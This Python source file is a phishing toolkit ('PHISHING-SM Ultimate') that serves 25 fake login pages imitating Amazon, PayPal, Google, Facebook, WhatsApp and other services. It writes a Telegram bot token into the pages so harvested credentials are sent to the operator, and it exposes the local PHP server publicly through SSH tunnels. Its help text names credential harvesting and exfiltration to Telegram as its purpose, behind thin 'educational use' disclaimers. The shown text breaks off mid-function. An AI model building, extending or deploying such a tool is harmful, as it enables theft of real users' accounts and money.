#!/usr/bin/env python3
"""
PHISHING-SM Tool - Python Ultimate Version
Educational penetration testing tool for authorized security testing only
Enhanced with intelligent control system and full compatibility
"""

import os
import sys
import time
import socket
import subprocess
import threading
import requests
import re
import random
import signal
import select
import readline
import json
import tempfile
import shutil
from pathlib import Path
from datetime import datetime
from urllib.parse import urlparse

# Enhanced Color codes for terminal output
class Colors:
    RED = '\033[1;91m'
    GREEN = '\033[1;92m'
    YELLOW = '\033[1;93m'
    BLUE = '\033[1;94m'
    PURPLE = '\033[1;95m'
    CYAN = '\033[1;96m'
    WHITE = '\033[1;97m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_BLUE = '\033[44m'
    BG_YELLOW = '\033[43m'
    BG_PURPLE = '\033[45m'
    BG_CYAN = '\033[46m'
    NC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class AdvancedPhishingTool:
    def __init__(self):
        self.current_token = ""
        self.php_pid = None
        self.ssh_pid = None
        self.tunnel_url = ""
        self.php_port = None
        self.user_id = ""
        self.selected_page = ""
        self.processes = []
        self.session_file = "phishing_session.json"
        self.log_file = "phishing_debug.log"
        self.backup_files = []
        
        # Enhanced pages database with categories
        self.pages = {
            "01": {"file": "amazon.php", "name": "Amazon", "category": "E-commerce"},
            "02": {"file": "camera.php", "name": "Camera", "category": "Permissions"}, 
            "03": {"file": "collection.php", "name": "Collection", "category": "Data Collection"},
            "04": {"file": "copy.php", "name": "Copy Access", "category": "Clipboard"},
            "05": {"file": "discord.php", "name": "Discord", "category": "Social"},
            "06": {"file": "facebookg.php", "name": "Facebook", "category": "Social"},
            "07": {"file": "freefire.php", "name": "Freefire", "category": "Gaming"},
            "08": {"file": "github.php", "name": "Github", "category": "Development"},
            "09": {"file": "google.php", "name": "Google", "category": "Services"},
            "10": {"file": "instagram.php", "name": "Instagram", "category": "Social"},
            "11": {"file": "location.php", "name": "Location", "category": "Permissions"},
            "12": {"file": "microsoft.php", "name": "Microsoft", "category": "Services"},
            "13": {"file": "netflix.php", "name": "Netflix", "category": "Streaming"},
            "14": {"file": "paypal.php", "name": "Paypal", "category": "Financial"},
            "15": {"file": "peace.php", "name": "Peace", "category": "Gaming"},
            "16": {"file": "pupgmobile.php", "name": "PubgMobile", "category": "Gaming"},
            "17": {"file": "record.php", "name": "Record", "category": "Permissions"},
            "18": {"file": "roblox.php", "name": "Roblox", "category": "Gaming"},
            "19": {"file": "snab.php", "name": "Snab Chat", "category": "Messaging"},
            "20": {"file": "spotify.php", "name": "Spotify", "category": "Streaming"},
            "21": {"file": "telegram.php", "name": "Telegram", "category": "Messaging"},
            "22": {"file": "tiktok.php", "name": "Tiktok", "category": "Social"},
            "23": {"file": "whatsapp.php", "name": "Whatsapp", "category": "Messaging"},
            "24": {"file": "x.php", "name": "X (Twitter)", "category": "Social"},
            "25": {"file": "yallalido.php", "name": "Yallalido", "category": "Regional"}
        }
        
        # Enhanced port selection with priorities
        self.common_ports = [8080, 8081, 8082, 8083, 3333, 4444, 5555, 6666, 7777, 8888, 9999, 10000, 1337, 3000, 5000, 7000, 9000]
        
        # SSH tunnel providers for fallback
        self.tunnel_providers = [
            "localhost.run",
            "serveo.net",
            "ngrok.com"  # Would require ngrok binary
        ]
        
        # System compatibility checks
        self.is_termux = self.check_termux()
        self.is_kali = self.check_kali()
        self.is_linux = sys.platform.startswith('linux')
        
        # Enhanced signal handling
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        # Initialize logging
        self.setup_logging()
        
        # Load previous session if exists
        self.load_session()

    def setup_logging(self):
        """Setup advanced logging system"""
        try:
            with open(self.log_file, 'w') as f:
                f.write(f"PHISHING-SM Log - Started at {datetime.now()}\n")
                f.write(f"System: {sys.platform}, Termux: {self.is_termux}, Kali: {self.is_kali}\n")
        except:
            pass

    def log_event(self, event, level="INFO"):
        """Log events with timestamp"""
        try:
            with open(self.log_file, 'a') as f:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"[{timestamp}] [{level}] {event}\n")
        except:
            pass

    def check_termux(self):
        """Check if running in Termux environment"""
        return 'com.termux' in os.environ.get('PREFIX', '')

    def check_kali(self):
        """Check if running in Kali Linux"""
        try:
            with open('/etc/os-release', 'r') as f:
                content = f.read().lower()
                return 'kali' in content
        except:
            return False

    def load_session(self):
        """Load previous session data"""
        try:
            if os.path.exists(self.session_file):
                with open(self.session_file, 'r') as f:
                    data = json.load(f)
                    self.current_token = data.get('token', '')
                    self.user_id = data.get('user_id', '')
                self.print_color("[+] Loaded previous session", Colors.GREEN)
        except Exception as e:
            self.log_event(f"Failed to load session: {str(e)}", "ERROR")

    def save_session(self):
        """Save current session data"""
        try:
            data = {
                'token': self.current_token,
                'user_id': self.user_id,
                'timestamp': datetime.now().isoformat()
            }
            with open(self.session_file, 'w') as f:
                json.dump(data, f)
        except Exception as e:
            self.log_event(f"Failed to save session: {str(e)}", "ERROR")

    def signal_handler(self, signum, frame):
        """Enhanced signal handler for graceful cleanup"""
        self.print_color(f"\n\n{Colors.RED}[!] Received signal {signum}, performing graceful cleanup...{Colors.NC}", Colors.RED)
        self.cleanup()
        sys.exit(0)

    def print_color(self, text, color=Colors.WHITE, end="\n"):
        """Enhanced colored printing with auto-flush"""
        print(f"{color}{text}{Colors.NC}", end=end, flush=True)

    def print_banner(self):
        """Enhanced banner with system detection"""
        os.system('clear')
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗ ███████╗██████╗   ║
║  ██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝ ██╔════╝██╔══██╗  ║
║  ██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗█████╗  ██████╔╝  ║
║  ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║██╔══╝  ██╔══██╗  ║
║  ██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝███████╗██║  ██║  ║
║  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝  ║
║                                                                              ║
║                         ███████╗███╗   ███╗                                 ║
║                         ██╔════╝████╗ ████║                                 ║
║                         ███████╗██╔████╔██║                                 ║
║                         ╚════██║██║╚██╔╝██║                                 ║
║                         ███████║██║ ╚═╝ ██║                                 ║
║                         ╚══════╝╚═╝     ╚═╝                                 ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.NC}"""
        
        print(banner)
        
        # System information
        system_info = f"{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ SYSTEM INFORMATION ══════════════════════════{Colors.NC}"
        print(system_info)
        print(f"{Colors.CYAN}[+] System Platform: {Colors.WHITE}{sys.platform}{Colors.NC}")
        print(f"{Colors.CYAN}[+] Termux Detected: {Colors.WHITE}{self.is_termux}{Colors.NC}")
        print(f"{Colors.CYAN}[+] Kali Linux: {Colors.WHITE}{self.is_kali}{Colors.NC}")
        print(f"{Colors.CYAN}[+] Python Version: {Colors.WHITE}{sys.version.split()[0]}{Colors.NC}")
        
        tool_info = f"{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ TOOL INFORMATION ═══════════════════════════{Colors.NC}"
        print(tool_info)
        print(f"{Colors.CYAN}[+] Tool: {Colors.WHITE}PHISHING-SM ULTIMATE PYTHON{Colors.NC}")
        print(f"{Colors.CYAN}[+] Version: {Colors.WHITE}1.0 - Enhanced Edition{Colors.NC}")
        print(f"{Colors.CYAN}[+] Coder: {Colors.WHITE}@A_Y_TR{Colors.NC}")
        print(f"{Colors.CYAN}[+] Channel: {Colors.WHITE}https://t.me/cybersecurityTemDF{Colors.NC}")
        print(f"{Colors.BG_BLUE}{Colors.WHITE}════════════════════════════════════════════════════════════════════════{Colors.NC}")
        
        warnings = f"{Colors.YELLOW}[!] The developer is not responsible for any incorrect use of the tool{Colors.NC}"
        print(warnings)
        print(f"{Colors.RED}[!] PHISHING TOOL - FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY{Colors.NC}")
        print(f"{Colors.GREEN}[+] All rights reserved: Mohamed Abu Al-Saud{Colors.NC}")
        print(f"{Colors.BG_BLUE}{Colors.WHITE}════════════════════════════════════════════════════════════════════════{Colors.NC}")
        print()

    def show_help(self):
        """Enhanced help system with detailed information"""
        os.system('clear')
        self.print_color(f"{Colors.BG_PURPLE}{Colors.WHITE}══════════════════════════ ENHANCED HELP SYSTEM ═══════════════════════════{Colors.NC}")
        
        help_sections = [
            {
                "title": "TOOL OVERVIEW",
                "content": [
                    "PHISHING-SM ULTIMATE is an advanced penetration testing tool designed for:",
                    "• Credential harvesting through fake login pages",
                    "• Device information collection and browser fingerprinting",
                    "• Real-time data exfiltration to Telegram bot",
                    "• Multi-platform compatibility (Termux, Kali Linux, Linux)"
                ]
            },
            {
                "title": "ENHANCED FEATURES",
                "content": [
                    "✓ Intelligent process management and auto-recovery",
                    "✓ Session persistence and state management",
                    "✓ Advanced error handling and logging",
                    "✓ Multiple SSH tunnel providers with fallback",
                    "✓ Real-time service monitoring and health checks",
                    "✓ Automated dependency resolution",
                    "✓ Smart token management with auto-cleanup",
                    "✓ QR code generation and URL validation",
                    "✓ Cross-platform compatibility layer"
                ]
            },
            {
                "title": "CONTROL SYSTEM",
                "content": [
                    "The tool features an intelligent control system that allows:",
                    "• Real-time process monitoring and management",
                    "• Service health checks and auto-restart",
                    "• Log viewing and debugging capabilities",
                    "• URL testing and validation",
                    "• Graceful shutdown and cleanup"
                ]
            }
        ]
        
        for section in help_sections:
            self.print_color(f"\n{Colors.BG_CYAN}{Colors.WHITE} {section['title']} {Colors.NC}")
            for line in section['content']:
                self.print_color(f"  {Colors.CYAN}•{Colors.WHITE} {line}{Colors.NC}")
        
        self.print_color(f"\n{Colors.BG_YELLOW}{Colors.WHITE} ADVANCED USAGE {Colors.NC}")
        usage_info = [
            f"{Colors.GREEN}1.{Colors.WHITE} Configure Telegram bot token and user ID",
            f"{Colors.GREEN}2.{Colors.WHITE} Select phishing page from the menu",
            f"{Colors.GREEN}3.{Colors.WHITE} Tool automatically starts PHP server and SSH tunnel",
            f"{Colors.GREEN}4.{Colors.WHITE} Monitor services using the interactive control panel",
            f"{Colors.GREEN}5.{Colors.WHITE} Use generated URL for testing",
            f"{Colors.GREEN}6.{Colors.WHITE} All credentials are sent to your Telegram bot automatically"
        ]
        
        for line in usage_info:
            print(line)
        
        self.print_color(f"\n{Colors.BG_RED}{Colors.WHITE} LEGAL AND ETHICAL WARNING {Colors.NC}")
        warnings = [
            f"{Colors.RED}⚠{Colors.WHITE} This tool is for educational purposes only",
            f"{Colors.RED}⚠{Colors.WHITE} Use only on systems you own or have explicit permission to test",
            f"{Colors.RED}⚠{Colors.WHITE} Compliance with local laws and regulations is mandatory",
            f"{Colors.RED}⚠{Colors.WHITE} Developer is not responsible for any misuse or damage"
        ]
        
        for line in warnings:
            print(line)
        
        input(f"\n{Colors.YELLOW}[!] Press any key to return to main menu...{Colors.NC}")

    def animated_loading(self, text, duration=2, steps=20):
        """Enhanced loading animation with progress"""
        spinner = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
        step_duration = duration / steps
        
        self.print_color(f"{Colors.CYAN}[+]{Colors.NC} {text} ", end="")
        
        for i in range(steps):
            self.print_color(f"{Colors.YELLOW}{spinner[i % len(spinner)]}{Colors.NC}", end="")
            sys.stdout.flush()
            time.sleep(step_duration)
            self.print_color("\b", end="")
        
        self.print_color(f"{Colors.GREEN}✓{Colors.NC}")

    def check_dependencies(self):
        """Enhanced dependency checking with intelligent installation"""
        self.print_color(f"{Colors.CYAN}[+] Starting advanced dependency check...{Colors.NC}")
        
        # Categorized dependencies
        dependencies = {
            "critical": ["php", "ssh"],
            "important": ["curl", "wget"],
            "optional": ["qrencode", "tmux", "ngrok"]
        }
        
        all_deps = []
        for category in dependencies.values():
            all_deps.extend(category)
        
        # Check what's available
        available = {}
        missing = {}
        
        for category, deps in dependencies.items():
            available[category] = []
            missing[category] = []
            
            for dep in deps:
                if self.check_command_exists(dep):
                    available[category].append(dep)
                    self.print_color(f"{Colors.GREEN}[✓] {dep:12} - Available{Colors.NC}")
                else:
                    missing[category].append(dep)
                    color = Colors.RED if category == "critical" else Colors.YELLOW
                    self.print_color(f"{color}[-] {dep:12} - Missing ({category}){Colors.NC}")
        
        # Handle missing dependencies
        if missing["critical"]:
            self.print_color(f"{Colors.RED}[!] Critical dependencies missing: {', '.join(missing['critical'])}{Colors.NC}")
            self.print_color(f"{Colors.YELLOW}[!] Attempting automatic installation...{Colors.NC}")
            
            if not self.install_dependencies(missing["critical"]):
                self.print_color(f"{Colors.RED}[ERROR] Failed to install critical dependencies{Colors.NC}")
                return False
        
        if missing["important"]:
            self.print_color(f"{Colors.YELLOW}[!] Important dependencies missing: {', '.join(missing['important'])}{Colors.NC}")
            self.install_dependencies(missing["important"])
        
        if missing["optional"]:
            self.print_color(f"{Colors.CYAN}[!] Optional dependencies missing: {', '.join(missing['optional'])}{Colors.NC}")
            self.print_color(f"{Colors.CYAN}[!] These are nice to have but not required{Colors.NC}")
        
        self.print_color(f"{Colors.GREEN}[+] Dependency check completed successfully{Colors.NC}")
        return True

    def check_command_exists(self, command):
        """Enhanced command existence check"""
        try:
            if command == "php":
                # Check PHP version and capabilities
                result = subprocess.run(["php", "-v"], capture_output=True, text=True, timeout=5)
                return result.returncode == 0
            elif command == "ssh":
                result = subprocess.run(["ssh", "-V"], capture_output=True, text=True, timeout=5)
                return result.returncode == 0
            else:
                return subprocess.call(f"command -v {command}", shell=True, 
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0
        except:
            return False

    def install_dependencies(self, dependencies):
        """Enhanced dependency installation with multiple package managers"""
        self.print_color(f"{Colors.YELLOW}[!] Installing dependencies: {', '.join(dependencies)}{Colors.NC}")
        
        package_managers = [
            {
                "name": "apt-get",
                "update": ["apt-get", "update"],
                "install": ["apt-get", "install", "-y"],
                "check": ["apt-get", "--version"]
            },
            {
                "name": "yum", 
                "update": ["yum", "update", "-y"],
                "install": ["yum", "install", "-y"],
                "check": ["yum", "--version"]
            },
            {
                "name": "pacman",
                "update": ["pacman", "-Sy"],
                "install": ["pacman", "-S", "--noconfirm"],
                "check": ["pacman", "--version"]
            },
            {
                "name": "brew",
                "update": ["brew", "update"],
                "install": ["brew", "install"],
                "check": ["brew", "--version"]
            },
            {
                "name": "pkg",  # Termux
                "update": ["pkg", "update"],
                "install": ["pkg", "install", "-y"],
                "check": ["pkg", "--version"]
            }
        ]
        
        for pm in package_managers:
            if self.check_command_exists(pm["check"][0]):
                self.print_color(f"{Colors.GREEN}[+] Using package manager: {pm['name']}{Colors.NC}")
                
                try:
                    # Update package lists
                    self.print_color(f"{Colors.YELLOW}[!] Updating package lists...{Colors.NC}")
                    subprocess.run(pm["update"], check=True, capture_output=True)
                    
                    # Install dependencies
                    install_cmd = pm["install"] + dependencies
                    self.print_color(f"{Colors.YELLOW}[!] Executing: {' '.join(install_cmd)}{Colors.NC}")
                    
                    process = subprocess.run(install_cmd, capture_output=True, text=True)
                    if process.returncode == 0:
                        self.print_color(f"{Colors.GREEN}[+] Successfully installed dependencies{Colors.NC}")
                        return True
                    else:
                        self.print_color(f"{Colors.RED}[-] Installation failed with {pm['name']}{Colors.NC}")
                        continue
                        
                except subprocess.CalledProcessError as e:
                    self.print_color(f"{Colors.RED}[-] Package manager error: {str(e)}{Colors.NC}")
                    continue
                except Exception as e:
                    self.print_color(f"{Colors.RED}[-] Installation error: {str(e)}{Colors.NC}")
                    continue
        
        self.print_color(f"{Colors.RED}[ERROR] Could not install dependencies automatically{Colors.NC}")
        self.print_color(f"{Colors.YELLOW}[!] Please install manually: {', '.join(dependencies)}{Colors.NC}")
        return False

    def validate_token(self, token):
        """Enhanced token validation with detailed feedback"""
        if not token or len(token) < 40:
            self.print_color(f"{Colors.RED}[-] Token too short (minimum 40 characters){Colors.NC}", Colors.RED)
            return False
        
        if not re.match(r'^[0-9]{8,10}:[a-zA-Z0-9_-]{35,}$', token):
            self.print_color(f"{Colors.RED}[-] Invalid token format{Colors.NC}", Colors.RED)
            self.print_color(f"{Colors.YELLOW}[!] Expected format: 123456789:ABCdefGHIjklMNopQRstUVwxyz-0123456789{Colors.NC}", Colors.YELLOW)
            return False
        
        # Test token with Telegram API
        self.print_color(f"{Colors.CYAN}[+] Validating token with Telegram API...{Colors.NC}", Colors.CYAN)
        try:
            response = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=10)
            if response.status_code == 200:
                self.print_color(f"{Colors.GREEN}[✓] Token is valid and active{Colors.NC}", Colors.GREEN)
                return True
            else:
                self.print_color(f"{Colors.RED}[-] Token validation failed (HTTP {response.status_code}){Colors.NC}", Colors.RED)
                return False
        except Exception as e:
            self.print_color(f"{Colors.YELLOW}[!] Could not validate token online: {str(e)}{Colors.NC}", Colors.YELLOW)
            self.print_color(f"{Colors.YELLOW}[!] Continuing with format validation only{Colors.NC}", Colors.YELLOW)
            return True

    def validate_id(self, user_id):
        """Enhanced user ID validation"""
        if not user_id.isdigit():
            self.print_color(f"{Colors.RED}[-] User ID must contain only numbers{Colors.NC}", Colors.RED)
            return False
        
        if len(user_id) < 5:
            self.print_color(f"{Colors.RED}[-] User ID too short (minimum 5 digits){Colors.NC}", Colors.RED)
            return False
        
        if len(user_id) > 15:
            self.print_color(f"{Colors.RED}[-] User ID too long (maximum 15 digits){Colors.NC}", Colors.RED)
            return False
        
        self.print_color(f"{Colors.GREEN}[✓] User ID format is valid{Colors.NC}", Colors.GREEN)
        return True

    def create_backup(self):
        """Create backup of PHP files before modification"""
        self.print_color(f"{Colors.CYAN}[+] Creating backup of PHP files...{Colors.NC}")
        backup_dir = "php_backup_" + datetime.now().strftime("%Y%m%d_%H%M%S")
        os.makedirs(backup_dir, exist_ok=True)
        
        for php_file in Path('.').glob('*.php'):
            try:
                shutil.copy2(php_file, os.path.join(backup_dir, php_file.name))
                self.backup_files.append(php_file)
            except Exception as e:
                self.print_color(f"{Colors.RED}[-] Failed to backup {php_file}: {str(e)}{Colors.NC}")
        
        self.print_color(f"{Colors.GREEN}[+] Backup created in: {backup_dir}{Colors.NC}")

    def search_and_replace_token(self, token):
        """Enhanced token replacement with backup and validation"""
        self.print_color(f"{Colors.CYAN}[+] Starting advanced token replacement...{Colors.NC}")
        
        # Create backup first
        self.create_backup()
        
        updated_files = 0
        total_files = 0
        replacement_stats = {}
        
        for php_file in Path('.').glob('*.php'):
            total_files += 1
            try:
                with open(php_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                original_content = content
                replacements = 0
                
                # Multiple replacement patterns
                patterns = [
                    r'BBOTTTTTTTTTTT',
                    r'YOUR_BOT_TOKEN',
                    r'BOT_TOKEN',
                    r'TELEGRAM_BOT_TOKEN'
                ]
                
                for pattern in patterns:
                    if pattern in content:
                        content = content.replace(pattern, token)
                        replacements += content.count(token) - original_content.count(token)
                
                if replacements > 0:
                    with open(php_file, 'w', encoding='utf-8') as f:
                        f.write(content)
                    
                    # Verify replacement
                    with open(php_file, 'r', encoding='utf-8') as f:
                        if token in f.read():
                            updated_files += 1
                            replacement_stats[php_file.name] = replacements
                            self.print_color(f"{Colors.GREEN}[✓] {php_file}: {replacements} replacements{Colors.NC}")
                        else:
                            self.print_color(f"{Colors.RED}[-] Verification failed for {php_file}{Colors.NC}")
                
            except Exception as e:
                self.print_color(f"{Colors.RED}[-] Error processing {php_file}: {str(e)}{Colors.NC}")
        
        # Summary
        self.print_color(f"\n{Colors.BG_GREEN}{Colors.WHITE} TOKEN REPLACEMENT SUMMARY {Colors.NC}")
        self.print_color(f"{Colors.CYAN}[+] Files processed: {total_files}{Colors.NC}")
        self.print_color(f"{Colors.CYAN}[+] Files updated: {updated_files}{Colors.NC}")
        self.print_color(f"{Colors.CYAN}[+] Total replacements: {sum(replacement_stats.values())}{Colors.NC}")
        
        if replacement_stats:
            self.print_color(f"{Colors.CYAN}[+] Replacement details:{Colors.NC}")
            for file, count in replacement_stats.items():
                self.print_color(f"    {Colors.WHITE}{file}: {count} replacements{Colors.NC}")
        
        return updated_files > 0

    def revert_token(self):
        """Enhanced token reversion with smart detection"""
        if not self.current_token:
            self.print_color(f"{Colors.YELLOW}[!] No token to revert{Colors.NC}")
            return
        
        self.print_color(f"{Colors.CYAN}[+] Starting intelligent token reversion...{Colors.NC}")
        
        reverted_files = 0
        scanned_files = 0
        
        for php_file in Path('.').glob('*.php'):
            scanned_files += 1
            try:
                with open(php_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                if self.current_token in content:
                    self.print_color(f"{Colors.YELLOW}[+] Reverting token in: {php_file}{Colors.NC}")
                    
                    # Replace token with original placeholder
                    content = content.replace(self.current_token, 'BBOTTTTTTTTTTT')
                    
                    with open(php_file, 'w', encoding='utf-8') as f:
                        f.write(content)
                    
                    # Verify reversion
                    with open(php_file, 'r', encoding='utf-8') as f:
                        if self.current_token not in f.read():
                            reverted_files += 1
                            self.print_color(f"{Colors.GREEN}[✓] Successfully reverted: {php_file}{Colors.NC}")
                        else:
                            self.print_color(f"{Colors.RED}[-] Failed to revert: {php_file}{Colors.NC}")
                
            except Exception as e:
                self.print_color(f"{Colors.RED}[-] Error reverting {php_file}: {str(e)}{Colors.NC}")
        
        # Final verification
        self.print_color(f"\n{Colors.BG_BLUE}{Colors.WHITE} REVERSION COMPLETE {Colors.NC}")
        self.print_color(f"{Colors.CYAN}[+] Files scanned: {scanned_files}{Colors.NC}")
        self.print_color(f"{Colors.CYAN}[+] Files reverted: {reverted_files}{Colors.NC}")
        
        if reverted_files == 0:
            self.print_color(f"{Colors.GREEN}[✓] No token instances found in PHP files{Colors.NC}")
        else:
            self.print_color(f"{Colors.GREEN}[✓] Token successfully removed from all files{Colors.NC}")

    def show_enhanced_pages_menu(self):
        """Enhanced pages menu with categories and search"""
        self.print_color(f"{Colors.BG_BLUE}{Colors.WHITE}══════════════════════════ ENHANCED PAGES MENU ══════════════════════════{Colors.NC}")
        
        # Group pages by category
        categories = {}
        for num, info in self.pages.items():
            category = info["category"]
            if category not in categories:
                categories[category] = []
            categories[category].append((num, info))
        
        # Display by category
        for category, pages in categories.items():
            self.print_color(f"\n{Colors.BG_CYAN}{Colors.WHITE} {category} {Colors.NC}")
            
            for i in range(0, len(pages), 2):
                row = pages[i:i+2]
                line = "   "
                for num, info in row:
                    line += f"{Colors.GREEN}[{num}]{Colors.WHITE} {info['name']:15}{Colors.NC}"
                    if len(row) == 2 and row.index((num, info)) == 0:
                        line += "   "
                print(line)
        
        self.print_color(f"\n{Colors.BG_PURPLE}{Colors.WHITE} SPECIAL OPTIONS {Colors.NC}")
        print(f"   {Colors.GREEN}[00]{Colors.WHITE} Help & Information{Colors.NC}")
        print(f"   {Colors.GREEN}[26]{Colors.WHITE} Exit Tool{Colors.NC}")
        print(f"   {Colors.GREEN}[99]{Colors.WHITE} Refresh Menu{Colors.NC}")
        
        self.print_color(f"{Colors.BG_BLUE}{Colors.WHITE}════════════════════════════════════════════════════════════════════════{Colors.NC}")

    def stop_services_enhanced(self):
        """Enhanced service stopping with process tree killing"""
        self.print_color(f"{Colors.YELLOW}[!] Stopping all services with enhanced cleanup...{Colors.NC}")
        
        # Stop PHP server
        if self.php_pid:
            self.print_color(f"{Colors.YELLOW}[!] Stopping PHP server (PID: {self.php_pid})...{Colors.NC}")
            try:
                # Kill process group to ensure all child processes are stopped
                os.killpg(os.getpgid(self.php_pid), signal.SIGTERM)
                time.sleep(2)
                # Force kill if still running
                try:
                    os.kill(self.php_pid, signal.SIGKILL)
                except:
                    pass
            except (ProcessLookupError, OSError) as e:
                self.print_color(f"{Colors.YELLOW}[!] PHP server already stopped{Colors.NC}")
        
        # Stop SSH tunnel
        if self.ssh_pid:
            self.print_color(f"{Colors.YELLOW}[!] Stopping SSH tunnel (PID: {self.ssh_pid})...{Colors.NC}")
            try:
                os.killpg(os.getpgid(self.ssh_pid), signal.SIGTERM)
                time.sleep(2)
                try:
                    os.kill(self.ssh_pid, signal.SIGKILL)
                except:
                    pass
            except (ProcessLookupError, OSError):
                self.print_color(f"{Colors.YELLOW}[!] SSH tunnel already stopped{Colors.NC}")
        
        # Clean up any remaining processes
        cleanup_commands = [
            "pkill -f 'php -S'",
            "pkill -f 'ssh.*localhost.run'",
            "pkill -f 'ssh.*serveo.net'",
            "pkill -f 'ngrok'"
        ]
        
        for cmd in cleanup_commands:
            try:
                subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
        
        # Stop TMUX sessions
        if self.check_command_exists('tmux'):
            subprocess.run("tmux kill-session -t phishing-tunnel 2>/dev/null", shell=True)
        
        self.php_pid = None
        self.ssh_pid = None
        self.tunnel_url = ""
        
        self.print_color(f"{Colors.GREEN}[✓] All services stopped successfully{Colors.NC}")

    def check_port_available(self, port):
        """Enhanced port availability check"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(1)
                result = sock.connect_ex(('127.0.0.1', port))
                return result != 0
        except:
            return False

    def find_available_port(self):
        """Find available port with intelligent selection"""
        self.print_color(f"{Colors.CYAN}[+] Scanning for available ports...{Colors.NC}")
        
        for port in self.common_ports:
            if self.check_port_available(port):
                self.print_color(f"{Colors.GREEN}[+] Found available port: {port}{Colors.NC}")
                return port
        
        # If no common ports available, find random port
        for attempt in range(10):
            random_port = random.randint(10000, 65535)
            if self.check_port_available(random_port):
                self.print_color(f"{Colors.YELLOW}[!] Using random port: {random_port}{Colors.NC}")
                return random_port
        
        self.print_color(f"{Colors.RED}[-] Could not find available port{Colors.NC}")
        return None

    def start_php_server_enhanced(self):
        """Enhanced PHP server with health monitoring"""
        self.print_color(f"{Colors.CYAN}[+] Starting enhanced PHP server...{Colors.NC}")
        
        self.php_port = self.find_available_port()
        if not self.php_port:
            return False
        
        try:
            # Start PHP server with improved options
            cmd = ["php", "-S", f"127.0.0.1:{self.php_port}"]
            self.print_color(f"{Colors.YELLOW}[+] Executing: {' '.join(cmd)}{Colors.NC}")
            
            # Use process group for better control
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                preexec_fn=os.setsid,
                text=True
            )
            self.php_pid = process.pid
            
            # Health monitoring thread
            health_thread = threading.Thread(target=self.monitor_php_health, args=(process,))
            health_thread.daemon = True
            health_thread.start()
            
            # Wait for server to be ready
            self.print_color(f"{Colors.CYAN}[+] Waiting for PHP server to start...{Colors.NC}")
            
            max_wait = 20
            for i in range(max_wait):
                time.sleep(1)
                
                if not self.is_process_running(self.php_pid):
                    self.print_color(f"{Colors.RED}[-] PHP server process died{Colors.NC}")
                    return False
                
                if not self.check_port_available(self.php_port):  # Port is in use
                    # Test server responsiveness
                    try:
                        response = requests.get(f"http://127.0.0.1:{self.php_port}/", timeout=2)
                        if response.status_code == 200:
                            self.print_color(f"{Colors.GREEN}[✓] PHP server started successfully on port {self.php_port}{Colors.NC}")
                            
                            # Test the specific page
                            try:
                                page_response = requests.get(f"http://127.0.0.1:{self.php_port}/{self.selected_page}", timeout=2)
                                if page_response.status_code == 200:
                                    self.print_color(f"{Colors.GREEN}[✓] Page '{self.selected_page}' is accessible{Colors.NC}")
                                else:
                                    self.print_color(f"{Colors.YELLOW}[!] Page returned status {page_response.status_code}{Colors.NC}")
                            except:
                                self.print_color(f"{Colors.YELLOW}[!] Could not access page '{self.selected_page}'{Colors.NC}")
                            
                            return True
                    except:
                        pass  # Server might not be fully ready yet
                
                self.print_color(f"{Colors.YELLOW}[!] Waiting... ({i+1}/{max_wait}){Colors.NC}")
            
            self.print_color(f"{Colors.RED}[-] PHP server failed to start within timeout{Colors.NC}")
            return False
            
        except Exception as e:
            self.print_color(f"{Colors.RED}[-] Failed to start PHP server: {str(e)}{Colors.NC}")
            return False

    def monitor_php_health(self, process):
        """Monitor PHP server health in background"""
        try:
            while process.poll() is None:
                # Read output to prevent buffer filling
                try:
                    output = process.stdout.readline()
                    if output:
                        self.log_event(f"PHP: {output.strip()}", "DEBUG")
                except:
                    pass
                time.sleep(1)
        except:
            pass

    def start_ssh_tunnel_enhanced(self):
        """Enhanced SSH tunnel with multiple providers and fallback"""
        self.print_color(f"{Colors.CYAN}[+] Starting enhanced SSH tunnel system...{Colors.NC}")
        
        # Try different tunnel methods
        methods = [
            self.start_ssh_tunnel_tmux,
            self.start_ssh_tunnel_background,
            self.start_ssh_tunnel_direct
        ]
        
        for method in methods:
            self.print_color(f"{Colors.YELLOW}[!] Trying method: {method.__name__}{Colors.NC}")
            if method():
                return True
            time.sleep(2)
        
        self.print_color(f"{Colors.RED}[-] All SSH tunnel methods failed{Colors.NC}")
        return False

    def start_ssh_tunnel_tmux(self):
        """Enhanced TMUX-based SSH tunnel"""
        if not self.check_command_exists('tmux'):
            self.print_color(f"{Colors.YELLOW}[-] TMUX not available{Colors.NC}")
            return False
        
        self.print_color(f"{Colors.GREEN}[+] Using enhanced TMUX tunnel system...{Colors.NC}")
        
        # Kill existing session
        subprocess.run("tmux kill-session -t phishing-tunnel 2>/dev/null", shell=True)
        time.sleep(1)
        
        # Build SSH command
        ssh_cmd = self.build_ssh_command()
        
        # Start TMUX session
        cmd = f"tmux new-session -d -s phishing-tunnel '{ssh_cmd}'"
